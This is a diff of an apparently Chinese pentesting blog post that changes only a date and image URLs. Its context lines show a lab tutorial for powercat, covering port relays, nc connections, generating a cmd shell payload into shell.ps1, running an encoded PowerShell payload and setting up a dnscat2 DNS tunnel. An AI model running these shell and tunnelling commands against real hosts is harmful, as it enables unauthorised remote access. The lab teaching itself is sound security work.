@@ -420,7 +420,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-06-01
+                    2021-08-04
                 </div>
                 
 
@@ -498,7 +498,7 @@ windows10    172.16.214.21</code></pre>
 <pre><code>powercat -l -v -p 5555 -r tcp:172.16.214.21:4444</code></pre>
 <p>最后在 kali 下连接 win7</p>
 <pre><code>nc -v 172.16.214.2 5555</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_14-23-47.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_14-23-47.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p>
 <pre><code>powercat -l -p 4444 -e cmd -g &gt; shell.ps1</code></pre>
 <p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p>
@@ -516,7 +516,7 @@ windows10    172.16.214.21</code></pre>
 <pre><code>powercat -l -p 4444 -v</code></pre>
 <p>在靶机上执行刚生成的 payload</p>
 <pre><code>powershell -e payload</code></pre>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_15-35-24.png"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_15-35-24.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p>
 <h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p>
 <p>在服务端上安装 dnscat ，以 kali 为例</p>
 <pre><code>git clone https://github.com/iagox86/dnscat2.git
